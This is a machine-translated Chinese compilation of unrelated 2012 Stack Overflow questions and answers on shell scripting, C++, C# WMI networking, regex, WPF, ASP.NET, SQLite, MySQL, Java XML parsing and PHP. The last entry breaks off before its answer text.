> 标签：linux, shell

我有一个将运行 3 个脚本的脚本，我需要将这 3 个脚本放入一个名为 date and time 的文件夹中，该文件夹将从系统中获取。

例如

1.  我有一个名为 A.sh、B.sh、C.sh 的 3 个脚本，这三个脚本是从一个脚本运行的。
2.  每个脚本都有不同的输出。
3.  这三个输出应该在一个名为 date_and_time 的目录中
4.  我会给你一张小图应该如何输出[http://photouploads.com/images/example.png](http://photouploads.com/images/example.png)

谁能建议我如何解决这个问题

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-22T12:57:15.420

如果您想要的是有时间戳的输出目录，这可能是一个很好的起点：

```
#!/bin/sh

TIMESTAMP=`date +"%Y-%m-%d-%H:%M:%S"`

OUTPUT="$TIMESTAMP.d"

mkdir -p "$OUTPUT"

A.sh > "$OUTPUT/A.out"
B.sh > "$OUTPUT/B.out"
C.sh > "$OUTPUT/C.out"

echo "Lorem ipsum dolor sit amet..." > "$OUTPUT"/Text.txt

# Let our users know where to find the output...
echo "Output directory: $OUTPUT" 
```

基本上，此脚本使用[`date`](http://linux.die.net/man/1/date)命令以更标准化的格式获取当前日期和时间，然后创建一个具有相同名称的输出目录。

警告：如果您在同一计算机时钟秒内运行此脚本两次，则第二次运行的输出将覆盖第一次。我将把处理这个特殊的角落案例作为读者的练习......

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-22T12:21:32.737

您也可以使用这样的子外壳：

```
#!/bin/bash
DIRNAME=$(date +"%Y%m%d-%H%M%S")
( $DIRNAME/A.sh ; $DIRNAME/B.sh ; $DIRNAME/C.sh ) > $DIRNAME/Text.txt 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-22T11:57:52.903

你可以像这样使用 smth：（你的运行脚本的内容，比如说`run3.sh`）

```
#!/bin/bash
A.sh > date_and_time/A.output &
B.sh > date_and_time/B.output &
C.sh > date_and_time/C.output & 
```

# bash - Bash抑制内置输出？

> ID：11155518
> 
> 赞同：0
> 
> 时间：2012-06-22T11:42:46.033
> 
> 标签：bash, stderr, io-redirection

目前我正在使用这样的命令

```
$ teststring=$(cat foo.txt 2>/dev/null) 
```

无论文件是否存在，这都**没有输出，就像我想要的那样。**如果文件不存在，以下命令似乎没有办法**抑制输出。**

```
$ teststring=$(<foo.txt)
bash: foo.txt: No such file or directory 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-22T12:05:28.263

```
{ teststring=$(<foo.txt); } 2>/dev/null 
```

简单的解释是在重定向之前执行扩展。

技术解释是 Bash 的重定向/分配顺序存在[规范](http://pubs.opengroup.org/onlinepubs/9699919799/utilities/V3_chap02.html#tag_18_09_01)违规。这种特殊情况是一个允许的例外，但这并不是所有 shell 中的问题，并且行为可能会因上下文而异。无论如何，上述解决方法应该始终有效。

# c++ - 时间：2019-04-10 标签：c++constintinput

> ID：11155519
> 
> 赞同：-1
> 
> 时间：2012-06-22T11:42:46.893
> 
> 标签：c++, input, int, constants

我想给一个长度为x的数组。x 是用户输入。但问题是 x 必须是 const。

这是我的代码：

```
int *length = 0;
cin >> (*length);
const int arraylength = const_cast<int>(*length);
int l[arraylength]; 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-06-22T11:44:24.693

您不能在 C++ 中分配具有动态长度的基于堆栈的数组（您可以在 C 中）——长度需要是编译时常量。您需要动态分配数组（或使用`std::vector<>`）

```
int* l = new int[arrayLength];
// use l as you did before
delete[] l; // when you no longer need to access its contents 
```

此外，您声明了一个指针`length`，但它被初始化为`NULL`，这意味着您不能取消引用它（您`cin >> (*length);`将在运行时失败）

*注意*：由于您使用的是 C++，因此最好使用`std::vector<int>`而不是原始数组 - 如果需要，您可以获得动态调整大小和可能的边界检查（使用其`at()`成员函数时）的好处，也无需在使用时删除它RAII 习惯用法在其生命周期结束后清理分配的内存（这也提供了面对异常时的内存泄漏保护）。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-06-22T11:45:49.307

C++ 不支持 VLA（可变长度数组）。虽然`const`，您`int`在编译时并不固定。

备择方案：

```
std::vector<int> l(arraylength); 
```

或者

```
int* l = new int[arraylength];
//...
delete[] l; 
```

# c# - Win32_NetworkAdapterConfiguration .NET 4 - 设置静态 IP 适用于 XP 但不适用于 Windows 7

> ID：11155520
> 
> 赞同：3
> 
> 时间：2012-06-22T11:42:47.960
> 
> 标签：c#, windows-7, static-ip-address

我有一些代码，我目前正在使用这些代码来更改网络适配器的静态 IP。在 Windows XP 32 位机器（物理和虚拟机）上运行时，设置 IP 地址时会稍有停顿（约 1 秒），但似乎确实会更改 IP。

在 Windows 7 64 位机器上运行时，它无法更改 IP 地址。尝试进行更改时不会暂停，也不会引发异常。

我已经进行了大量的谷歌搜索，大多数建议似乎只是以管理员身份运行。我尝试右键单击可执行文件并选择“以管理员身份运行”，我尝试创建快捷方式并将其设置为以管理员身份运行，并且我尝试更新清单文件（它确实要求管理员权限）启动，但仍不更改 IP 地址。）

任何人都可以提供任何建议吗？

代码如下：

```
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Management; // You will need to add a reference for System.Management!

namespace NetAdapt
{
  class Program
  {
    static void Main(string[] args)
    {
      // First display all network adaptors 
      DisplayNetworkAdaptors(-1);

      // Now try to set static IP, subnet mask and default gateway for adaptor with
      // index of 1 (may be different for your machine!)
      SetIP(1, 
        new string[] { "10.10.1.222" }, 
        new string[] { "255.255.255.0" }, 
        new string[] { "10.10.1.10" });

      // Now display network adaptor settings for adaptor 1 (may be different for your machine!)
      DisplayNetworkAdaptors(1);

      Console.ReadLine();
    }

    private static void SetIP(int index, string[] newIPAddress, string[] newSubnetMask, string[] newGateway)
    {
      ManagementClass objMC = new ManagementClass("Win32_NetworkAdapterConfiguration");
      ManagementObjectCollection objMOC = objMC.GetInstances();

      foreach (ManagementObject objMO in objMOC)
      {
        if (!(bool)objMO["IPEnabled"]) continue;

        try
        {
          //Only change for device specified
          if ((uint)objMO["Index"] == index)
          {
            ManagementBaseObject objNewIP = null;
            ManagementBaseObject objSetIP = null;
            ManagementBaseObject objNewGate = null;
            objNewIP = objMO.GetMethodParameters("EnableStatic");
            objNewGate = objMO.GetMethodParameters("SetGateways");

            objNewGate["DefaultIPGateway"] = newGateway;
            objNewIP["IPAddress"] = newIPAddress;
            objNewIP["SubnetMask"] = newSubnetMask;

            objSetIP = objMO.InvokeMethod("EnableStatic", objNewIP, null);
            objSetIP = objMO.InvokeMethod("SetGateways", objNewGate, null);

            Console.WriteLine("Successfully changed IP!");
          }
        }
        catch (Exception ex)
        {
          Console.WriteLine("Exception setting IP: " + ex.Message);
        }
      }
    }

    private static void DisplayNetworkAdaptors(int index)
    {
      ManagementClass objMC = new ManagementClass("Win32_NetworkAdapterConfiguration");
      ManagementObjectCollection objMOC = objMC.GetInstances();

      foreach (ManagementObject objMO in objMOC)
      {
        try
        {
          // TCP enabled NICs only
          if (!(bool)objMO["IPEnabled"]) continue;

          // If index is -1 then display all network adaptors, otherwise only
          // display adaptor whose index matches parameter
          if ((index != -1) && ((uint)objMO["Index"] != index)) continue;

          Console.WriteLine("Caption           : " + (string)objMO["Caption"]);
          string[] defaultGateways=(string[])objMO["DefaultIPGateway"];
          if (defaultGateways != null)
          {
            for (int x = 0; x < defaultGateways.Count(); x++)
            {
              Console.WriteLine(string.Format("DefaultIPGateway{0} : {1}", x, defaultGateways[x]));
            }
          }
          else
          {
            Console.WriteLine("DefaultIPGateway  : NULL");
          }
          Console.WriteLine("Description       : " + (string)objMO["Description"]);
          Console.WriteLine("DHCPEnabled       : " + (bool)objMO["DHCPEnabled"]);
          Console.WriteLine("DHCPServer        : " + (string)objMO["DHCPServer"]);
          Console.WriteLine("Index             : " + (uint)objMO["Index"]);
          string[] ipAddresses = (string[])objMO["IPAddress"];
          if (ipAddresses != null)
          {
            for (int x = 0; x < ipAddresses.Count(); x++)
            {
              Console.WriteLine(string.Format("IPAddress{0}        : {1}", x, ipAddresses[x]));
            }
          }
          else
          {
            Console.WriteLine("IPAddress         : NULL");
          }
          Console.WriteLine("IPEnabled         : " + (bool)objMO["IPEnabled"]);
          string[] ipSubnets = (string[])objMO["IPSubnet"];
          if (ipSubnets != null)
          {
            for (int x = 0; x < ipSubnets.Count(); x++)
            {
              Console.WriteLine(string.Format("IPSubnet{0}         : {1}", x, ipSubnets[x]));
            }
          }
          else
          {
            Console.WriteLine("IPSubnet          : NULL");
          }
          Console.WriteLine("MACAddress        : " + (string)objMO["MACAddress"]);
          Console.WriteLine();

        }
        catch (Exception ex)
        {
          Console.WriteLine("Exception getting network adaptors: " + ex.Message);
        }
      }
    }
  }
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-22T15:36:17.283

好的，通过检查代码项目中的以下内容，终于设法找到了一种解决问题的方法：

[http://www.codeproject.com/Articles/19827/Chameleon-Connection-Settings-Manager](http://www.codeproject.com/Articles/19827/Chameleon-Connection-Settings-Manager)

在上述作者的代码中，他使用以下代码设置静态 IP：

```
objMO.InvokeMethod("EnableStatic", new object[] { newIPAddress, newSubnetMask });
objMO.InvokeMethod("SetGateways", new object[] { newGateway, new string[] { "1" } }); 
```

...在 Windows 7 上可以正常工作，但在 Windows XP 上不行。在我自己的代码中，我求助于询问 System.Environment.OSVersion.Version 并根据我是在 XP 还是 Windows 7 上运行来选择设置 IP 的方法。

# ruby-on-rails - 正则表达式验证澳大利亚手机号码

> ID：11155523
> 
> 赞同：1
> 
> 时间：2012-06-22T11:43:00.950
> 
> 标签：ruby-on-rails, regex, validation, mobile

我整理了这个验证数字的小正则表达式公式，以确保它们是正确[的澳大利亚手机号码](https://en.wikipedia.org/wiki/Telephone_numbers_in_Australia#Mobile_phone_numbers_.2804.2C_05.29)。我遇到的问题是新的 Telstra 号码不符合标准，因此会引发错误。

数字格式是它接受的是

0421813629、0430091460等...

虽然当我们使用 3 位数为 5 或更高的 a 时，它似乎会引发错误，而 Telstras 的新号码在该 3 位数位置有 7

```
/^(?:\+?61|0)4 ?(?:(?:[01] ?[0-9]|2 ?[0-57-9]|3 ?[1-9]|4 ?[7-9]|5 ?[018]) ?[0-9]|3 ?0 ?[0-5])(?: ?[0-9]){5}$/ 
```

我认为该错误与**?[0-57-9]|3 有关**

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-22T12:50:06.670

我只是为你重写整个事情。正则表达式将编译，但我还没有测试一切。正则表达式仅适用于已清除空格的字符串（因为空格可以是任意的，并且不会改变电话号码的含义）。正则表达式基于 Wikipedia 文章。如果有任何错误，祝你好运，如果他们决定分配备用块，也祝你好运。我通过将正在使用的 10^7、10^6、10^5 和 10^4 数字块组合在一起来编写正则表达式。

```
/^(?:\+?61|0)4(?:[01]\d{3}|(?:2[1-9]|3[0-57-9]|4[7-9]|5[0-15-9]|6[679]|7[3-8]|8[1478]|9[07-9])\d{2}|(?:20[2-9]|444|52[0-6]|68[3-9]|70[0-7]|79[01]|820|890|91[0-4])\d|(?:200[0-3]|201[01]|8984))\d{4}$/ 
```

如果您想让正则表达式可维护，您应该为每个电话公司编写单独的**字符串**，然后连接字符串并调用`RegExp`构造函数从字符串构建正则表达式。也许效率会低一些，但在维护它时你会保持理智。

# telerik - IsEnabled 属性背景颜色在 Wpf 中未更改

> ID：11155526
> 
> 赞同：0
> 
> 时间：2012-06-22T11:43:11.373
> 
> 标签：telerik, wpf-controls

在我的 WPF 文本框中，当 IsEnabled=false 时，背景颜色为灰色。但此背景颜色尚未在任何地方设置。当我设置

```
 <Trigger Property="IsEnabled" Value="false">
        <Setter Property="Background" Value="Blue"/> 
```

它不起作用。当我在属性中更改 IsEnabled="true" 时，我可以更改背景颜色。谁能解释一下为什么后台 prorerty 不适用于 IsEnabled="False"

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-22T12:17:38.827

实际上，您需要更新 TextBox 模板内的 Border 的背景。因此，您可以在触发器部分覆盖文本框的模板并在那里设置适当的背景。

您可以在[此处](http://msdn.microsoft.com/en-us/library/ms752068%28v=vs.85%29.aspx)找到所有默认的 TextBox 模板。

```
<Style x:Key="{x:Type TextBox}" TargetType="{x:Type TextBoxBase}">
    <Setter Property="SnapsToDevicePixels" Value="True"/>
    <Setter Property="OverridesDefaultStyle" Value="True"/>
    <Setter Property="KeyboardNavigation.TabNavigation" Value="None"/>
    <Setter Property="FocusVisualStyle" Value="{x:Null}"/>
    <Setter Property="MinWidth" Value="120"/>
    <Setter Property="MinHeight" Value="20"/>
    <Setter Property="AllowDrop" Value="true"/>
    <Setter Property="Template">
        <Setter.Value>
            <ControlTemplate TargetType="{x:Type TextBoxBase}">
                <Border 
        Name="Border"
        CornerRadius="2" 
        Padding="2"
        Background="{StaticResource WindowBackgroundBrush}"
        BorderBrush="{StaticResource SolidBorderBrush}"
        BorderThickness="1" >
                    <ScrollViewer Margin="0" x:Name="PART_ContentHost"/>
                </Border>
                <ControlTemplate.Triggers>
                    <Trigger Property="IsEnabled" Value="False">
                        <Setter TargetName="Border" Property="Background" Value="Blue"/>
                        <Setter TargetName="Border" Property="BorderBrush" Value="{StaticResource DisabledBackgroundBrush}"/>
                        <Setter Property="Foreground" Value="{StaticResource DisabledForegroundBrush}"/>
                    </Trigger>
                </ControlTemplate.Triggers>
            </ControlTemplate>
        </Setter.Value>
    </Setter>
</Style> 
```

# asp.net - ASP.NET 处理 PUT/DELETE 动词

> ID：11155528
> 
> 赞同：12
> 
> 时间：2012-06-22T11:43:26.437
> 
> 标签：asp.net, iis, asp.net-web-api

这通常适用于 ASP.NET，但也适用于 Web API。

我们如何在**不**启用 RAMMFAR (RunAllManagedModulesForAllRequests) 的情况下处理 PUT/DELETE 动词。

我无法在 IIS 中配置处理程序映射，因为我的站点托管在 Azure Web 角色上，并且我所做的任何更改都不会保留。

* * *

## 回答 #1

> 赞同：19
> 
> 时间：2012-06-22T14:42:54.403

@Alexander 的回答让我走上了正确的道路。必须添加以下内容才能让 ASP.NET 处理 DELETE/PUT：

```
 <system.webServer>
    <modules runAllManagedModulesForAllRequests="false"/>
    <handlers>
      <remove name="ExtensionlessUrl-Integrated-4.0" />
      <add name="ExtensionlessUrl-Integrated-4.0" 
           path="*." 
           verb="GET,HEAD,POST,DEBUG,DELETE,PUT" 
           type="System.Web.Handlers.TransferRequestHandler" 
           preCondition="integratedMode,runtimeVersionv4.0" />
    </handlers>
  </system.webServer> 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-06-24T02:42:00.770

FWIW，我们已经修改了 MVC/Web API 项目模板，以允许所有常见的 HTTP 动词完全使用上述机制。该更改将在下一次正式发布（将是 RTM）中提供。这将默认工作。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-06-22T13:48:38.203

已经尝试允许`System.WebServer`web.config 部分中的动词？

像这样的东西：

```
<System.WebServer>
     <handlers>
        <remove name="ExtensionlessUrlHandler-Integrated-4.0" />
        <add name="ExtensionlessUrlHandler-Integrated-4.0" 
        path="*." 
        verb="GET,HEAD,POST,DEBUG,PUT,DELETE" 
        modules="IsapiModule" 
        scriptProcessor="C:\Windows\Microsoft.NET\Framework64\v4.0.30319\aspnet_isapi.dll" 
        resourceType="Unspecified" 
        requireAccess="Script" 
        preCondition="classicMode,runtimeVersionv4.0,bitness64" 
        responseBufferLimit="0" />
    </handlers>
</System.WebServer> 
```

# java - 从 Java 中的 InputStream 将 SQLite 加载为 ReadOnly

> ID：11155537
> 
> 赞同：2
> 
> 时间：2012-06-22T11:44:12.857
> 
> 标签：java, sqlite, google-app-engine, jdbc

我有一个应用程序，它接收一个 SQLite 数据库来读取一些数据并将其导出为 CSV。我正在尝试将其上传到 Google App Engine，但我遇到了一个巨大的问题，我认为这使得该应用无法使用 GAE。

问题是，由于在 GAE 上我无法写入文件系统，我无法打开与 SQLite 文件的 JDBC 连接，因此我无法读取数据以转换为 CSV。我一直在寻找其他选项，例如谷歌云存储，但我不想在这个应用程序上使用我唯一的“免费试用”，实际上我不想在之后为这个应用程序付费免费试用期结束，所以这不是一个选项。

经过大量研究，我唯一的猜测是我可能能够直接从 InputStream 加载数据库，因为我是从我用来获取它的上传表单中收到的，但是，这是一个 100% 幸运的猜测，我'一直无法在网上找到任何关于这种方法的信息，但我只是不想相信任何现有的 SQLite JDBC 库都无法做到这一点，我希望这里有人能告诉我该怎么做它。

如果 InputStream 方法不可行，但您知道在 GAE 中以只读方式打开 SQLite DB 的其他方法，然后将其丢弃，请随时发表评论......

如果有另一个选项，例如“不要使用 JDBC，使用带有管道的套接字连接来打开与 InputStream 的连接”，我也想听听，它不必用 JDBC 来完成。

谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-22T13:04:28.643

JDBC 通常需要套接字，因此它不适用于 GAE。

我会尝试[将 SQLite 转储到 CSV](https://stackoverflow.com/questions/75675/how-do-i-dump-the-data-of-some-sqlite3-tables)，将文件上传到 GAE，然后[解析 CSV 内容](http://opencsv.sourceforge.net/)并插入数据库。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-06-28T14:36:35.360

简短的回答是“做不到”。至少不是当前的 JDBC 实现，而且实现一个可行的方法可能非常困难，我去了 SQLite 用户邮件列表，最后这就是结论。

您可以在[此处](http://sqlite.org:8080/cgi-bin/mailman/private/sqlite-users/2012-June/040320.html)关注主题，但在您必须[注册](http://sqlite.org:8080/cgi-bin/mailman/listinfo/sqlite-users)到邮件列表之前，因为它是私人的。

# ios - iOS 上表格数据的网格组件

> ID：11155539
> 
> 赞同：5
> 
> 时间：2012-06-22T11:44:19.073
> 
> 标签：ios, components

我有几个在 iOS 中显示表格数据的应用程序。最简单的解释方法可能是截图：

![MySQL 数据库客户端](../Images/dedb15d00a61f28b7e283cdb8de9af87.png)![MTG卡数据库](../Images/951b48bea842223847f4c4392f86d7e4.png)

正如你所看到的，我现在只是使用 HTML 论坛来显示这些数据。我在网格中寻找的是以下内容：

*   动态列（动态添加/删除列）
*   静态标题（即使向下滚动，列名也始终显示在表格顶部）
*   图像支持

好的事情：+列排序

我一直在寻找一个可以帮助我解决这个问题的图书馆，但我找不到任何东西。我什至愿意购买一个商业图书馆，但我需要找到一个。

有谁知道任何可能支持我正在寻找的图书馆？请注意，这适用于 iOS 而不是 Mac（否则我只会使用 NSTable）。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-20T12:54:42.953

您是否尝试过[ShinobiControls](http://www.shinobicontrols.com/shinobigrids/)的 Grid 组件？看起来相当不错。

# php - 为什么我的 MySQL 存储过程这么慢？

> ID：11155543
> 
> 赞同：1
> 
> 时间：2012-06-22T11:44:26.500
> 
> 标签：php, mysql, stored-procedures, pagespeed

我制作了一个运行两个查询的程序：一个查询贷方金额，第二个查询借方金额和未偿还的退货。

我已经为这些查询制定了一个程序。它返回相同的结果，但比简单查询花费的时间长五倍。

为什么程序需要更多时间？我读过程序比简单查询更快。

我的简单php方法

```
function getOutStandingBalance($OID)
{
    $strSQL  = "select sum(amount) from t where isdeleted=0 and iscredit=1 and oid='1212'";
    $Result1 = $this->ADb->ExecuteQuery($strSQL);

    $CreditSum = $Result1->fields[0];

    $strSQL  = "select sum(amount) from t where isdeleted=0 and iscredit=0 and oid='1212'";     $Result2 = $this->ADb->ExecuteQuery($strSQL);

    $DebitSum = $Result2->fields[0];

    $OutStandingBalance = sprintf("%2.2f",$CreditSum - $DebitSum);
    echo $OutStandingBalance;
} 
```

我的程序

```
DELIMITER $$

CREATE PROCEDURE `getOutStandingBalance`(OUT Total DECIMAL(16,2),IN OID INT)
    DETERMINISTIC
    COMMENT 'A procedure'
BEGIN
    DECLARE Credit DECIMAL(16,2);
    DECLARE Debit  DECIMAL(16,2);
    SELECT SUM(t.Amount) INTO Credit FROM `t` WHERE t.IsDeleted=0 AND t.IsCredit=1 AND t.OID=OID;

    SELECT SUM(t.Amount) INTO Debit FROM `t` WHERE t.IsDeleted=0 AND t.IsCredit=0 AND t.OID=OID;

    SET Total = IFNULL(Credit, 0) - IFNULL(Debit, 0);
END$$

DELIMITER ; 
```

带有过程调用的 PHP 脚本和带有基准测试的简单 php 查询调用

```
$begin = microtime(true);
$chkAmount      = $myTransaction->getOutStandingBalance(1212);
echo $chkAmount;
echo "<br />";
$end = microtime(true); 
echo "Time taken for normal:", $end - $begin;
$norml = $end - $begin;
echo "<br />";
echo "<br />";
$begin = microtime(true);
$stmt = "CALL getOutStandingBalance(@Total,1212)";
$rsstmt = "SELECT @Total;";
$rs = $myADb->Execute($stmt);
$rsstmt = $myADb->Execute($rsstmt);
echo $rsstmt->fields[0];
echo "<br />";
$end = microtime(true); 
echo "Time taken for Procedure:", $end - $begin; 

$procd = $end - $begin;

if($norml>$procd)
{
    echo "<br> Procedure is Fast.";
}
else
{
    echo "<br> Normal Query is Fast.";
} 
```

# java - 使用 WAN 和 IP 的点对点连接

> ID：11155546
> 
> 赞同：0
> 
> 时间：2012-06-22T11:44:41.227
> 
> 标签：java, android, networking, network-programming, p2p

> **可能重复：**
> [如何在不使用中间服务器的情况下使 android 点对点？](https://stackoverflow.com/questions/6298047/how-to-make-an-android-peer-to-peer-without-using-intermediate-server)

我有一个 WAN 地址 209.179.xx.xx，我的机器上的 Ip 是 192.168.xx 我可以通过 Internet 远程访问我的机器。是否可以使用此信息建立对等连接。我正在使用安卓系统。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-22T16:12:32.213

对于任何两台机器进行点对点通信，都应该能够相互[ping](http://en.wikipedia.org/wiki/Ping)以确保它们是可访问的。您的 WAN 应该有一个防火墙，可以限制/控制任何传入和传出连接。要使 WAN 内的机器在 Internet 上可用，您的系统管理员需要在防火墙上进行一些设置。

# java - Java XML文件解析-当我尝试获取节点时不断给出null

> ID：11155547
> 
> 赞同：0
> 
> 时间：2012-06-22T11:44:41.830
> 
> 标签：java, xml

我一直在尝试解析一个元素，但没有成功。当我运行这段代码时，我的调试打印方法打印出“null”，这意味着找不到该元素。

数组发送是一个句子列表。每个模式都是一个正则表达式模式。我想要做的是搜索一个句子是否匹配一个模式。如果是，请从多个模板中选择一个模板，否则创建一个新条目。我没有实现新条目的创建，因为我无法让下面的代码工作，

顺便说一句，节点的内容似乎为空，而不是节点本身。

```
for (int i = 0; i < sents.length; i++) {

for (int i1 = 0; i1 < categories.getLength(); i1++) {

Element root = parser.document.getDocumentElement();
NodeList categories = root.getChildNodes();
category = (Element) categories.item(i1);
pattern = category.getElementsByTagName("pattern").item(0);

if (pattern != null) {
     System.out.println(pattern.getNodeValue());
}
else {
 System.out.println("Pattern object is null.");
}

Pattern regex = Pattern.compile(pattern.getNodeValue());
        Matcher matcher = regex.matcher(sents[i]);

        if (matcher.matches()) { // If current sentence matches
            matches = true;
            break;
        }
}

if (matches) { // If found
    templates = category.getElementsByTagName("template");

    int chosen = Generator.generateInt(0,templates.getLength()-1); // Another class method tht generates an integer between 0 and templates.getLength()-1, note that the lower range and upper range are both inclusive.

    Node template = templates.item(chosen);

    System.out.println(template.getNodeValue());
}
} 
```

变量解析器被分配给一个类 XMLparser。XMLparser 的代码如下：

```
 public XMLparser(String name) {
    document = getDocument(name);
}

protected static Document getDocument(String name) {
    try {
        DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
        factory.setIgnoringComments(true);
        factory.setIgnoringElementContentWhitespace(true);
        factory.setValidating(true);
        DocumentBuilder builder = factory.newDocumentBuilder();
        return builder.parse(new InputSource(name));
    }
    catch (Exception e) {
        e.printStackTrace();
    }
    return null;
}

protected void saveFile(String name) {
    try {
        //write the content into xml file
        TransformerFactory transformerFactory = TransformerFactory.newInstance();
        Transformer transformer = transformerFactory.newTransformer();
        DOMSource source = new DOMSource(document);

        StreamResult result =  new StreamResult(new File(name+".xml"));
        transformer.transform(source, result);

        System.out.println("File saved!");
    }
    catch (Exception e) { e.printStackTrace(); }
} 
```

XML 文件是这样的：

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE categories SYSTEM "vocab.dtd">
<categories>
    <category>
        <pattern>WHAT IS YOUR NAME</pattern>
        <template>My name is JavaBot.</template>
    </category>
</categories> 
```

和 dtd 文件：

```
<?xml version="1.0" encoding="UTF-8"?>
<!ELEMENT categories (category*)>
<!ELEMENT category (pattern, template*)>
<!ELEMENT pattern (#PCDATA)>
<!ELEMENT template (#PCDATA)> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-22T12:05:09.140

我真的不明白你的第一段代码是如何编译的，更不用说它应该做什么了，因为你在一个循环中定义了一个由一个叫做分类的变量限制的分类，所以我一定遗漏了一些东西。但是，您的实际问题是您正在打印元素的节点值，这没什么。一个元素可以包含其他节点，但没有值。我认为您真的是要打印元素内的文本节点的值

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-22T12:07:36.430

尝试这样做，我从我的项目中举一个例子..这是一个单节点

**Xml 请求：**

```
<?xml version="1.0" encoding="UTF-8"?>
<request>
<token></token>
<key>xxxx</key>
<secret>xxxx</secret>
</request> 
```

**Xml 响应：**

```
<?xml version="1.0" encoding="UTF-8"?>
   <response>
   <token>2015fc52888d2953a30550c49d548299e8f5934d</token>
   </response> 
```

**DocumentBuilder 代码：**

```
public void getMToken(String xml){
        try {

                DocumentBuilderFactory odbf = DocumentBuilderFactory.newInstance();
                DocumentBuilder odb =  odbf.newDocumentBuilder();
                InputSource is = new InputSource(new StringReader(xml));
                Document odoc = odb.parse(is);
                odoc.getDocumentElement().normalize ();    
                System.out.println ("Root element of the doc is " + odoc.getDocumentElement().getNodeName());
                NodeList LOP = odoc.getElementsByTagName("response");

                    Node FPN =LOP.item(0);
                    if(FPN.getNodeType() == Node.ELEMENT_NODE)
                        {

                        Element token = (Element)FPN;

                        NodeList oNameList = token.getElementsByTagName("token");
                        Element firstNameElement = (Element)oNameList.item(0);
                        NodeList textNList = firstNameElement.getChildNodes();
                        this.setToken(((Node)textNList.item(0)).getNodeValue().trim());
                        System.out.println("#####The Parsed data#####");
                        System.out.println("token : " + ((Node)textNList.item(0)).getNodeValue().trim());
                        System.out.println("#####The Parsed data#####");

                        }//end of if clause

                      }catch (SAXParseException err) {

            System.out.println (err.getMessage ());

            }catch (SAXException e) {
                 e.printStackTrace ();

            }catch (Throwable t) {
            t.printStackTrace ();
            }          
        }//end of token function 
```

# php - 显式静态调用基类的成员函数

> ID：11155553
> 
> 赞同：8
> 
> 时间：2012-06-22T11:45:01.797
> 
> 标签：php, static, overloading

我有一个带有魔术方法的基类`__call`并已`_callStatic`定义，因此可以处理对未声明的成员函数的调用。

当你同时拥有非静态和静态的时，似乎不可能从派生类调用静态的，因为静态运算符`::`并不隐含地表示`static`如果与`parent`或在这种情况下，名称基类。这是这里解释的特殊语法：http: [//php.net/manual/pl/keyword.parent.php](http://php.net/manual/pl/keyword.parent.php)

我在这里要做的是调用的派生类`__callStatic`失败，因为调用默认为非静态调用并由`__call`.

如何对基类的成员函数进行显式静态调用？

```
<?php

class MyBaseClass {

    public static function __callStatic($what, $args)
    {
        return 'static call';
    }

    public function __call($what, $args)
    {
        return 'non-static call';
    }

}

class MyDerivedClass extends MyBaseClass {

    function someAction()
    {
        //this seems to be interpreted as parent::Foo()
        //and so does not imply a static call
        return MyBaseClass::Foo(); //
    }

}

$bar = new MyDerivedClass();
echo $bar->someAction(); //outputs 'non-static call'

?> 
```

请注意，删除非静态`__call`方法会使脚本输出“静态调用”，因为未声明`__callStatic`时调用了。`__call`

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-22T12:52:36.087

为了避免这种行为，您可以使用一个空的代理类，它不是链接`parent`并且`MyBaseClass`在运行时：

```
class MyBaseClass {

    public static function __callStatic($what, $args)
    {
        return 'static call ' . PHP_EOL;
    }

    public function __call($what, $args)
    {
        return 'dynamic call ' . PHP_EOL;
    }
}

class ProxyClass extends MyBaseClass {
    //"Empty" class
}

class MyDerivedClass extends MyBaseClass {

    function someAction()
    {
        return ProxyClass::Foo();
    }

}

$bar = new MyDerivedClass();
var_dump($bar->someAction()); //outputs 'static call' 
```

[http://pastebin.com/7JMJUmXt](http://pastebin.com/7JMJUmXt)

# java - 发送电子邮件时是否必须提及 SMTP 主机？

> ID：11155560
> 
> 赞同：1
> 
> 时间：2012-06-22T11:45:42.510
> 
> 标签：java, email, smtp

我的印象是，当我们从另一个域（即 abc@yahoo.com）向任何域（即 xyz@gmail.com）发送邮件时，Yahoo 服务器会自动从 Web 获取 gmail.com 的 SMTP 主机。

现在，我正在与 James 邮件服务器进行应用程序集成，并在 James 上创建了一个虚拟域（即 fdg@myJamesMail.com），并在我的主机文件中提供了 myJamesMail.com 的映射。但我仍然需要明确提及 SMTP 主机。

真的需要吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-06-22T11:49:51.383

当您以编程方式发送电子邮件时，您必须说明*您的*本地 SMTP 服务器 - 它将接受来自您的邮件并将它们传播到目标服务器的服务器。

如果你有一个“厚”的邮件客户端程序，这是配置的一部分——显然，如果你使用的是某种描述的网络邮件（例如 gmail），它是在网络端处理的。这就是为什么您在这种情况下作为用户不需要担心它 - 但作为*程序员*，您需要知道要连接到哪个主机，这意味着是信任发件人的 SMTP 服务器，而不是 SMTP与接收者关联的服务器。

# visual-studio-2010 - DLL 在 TFS 中自动签出

> ID：11155563
> 
> 赞同：1
> 
> 时间：2012-06-22T11:45:56.487
> 
> 标签：visual-studio-2010

每次我尝试构建我的项目时，我都会收到如图所示的弹出消息。我正在使用 TFS 2010。我尝试删除 dll，取消选中 dll 的只读选项。但是对于许多 dll，我仍然会弹出这个烦人的弹出窗口。首先构建它的用户会自动检查这些 dll。我该如何解决这个问题？请帮忙

![在此处输入图像描述](../Images/8405e9123251c5ba6d1702604a69718f.png)

* * *

## 回答 #1

> 赞同：1
> 
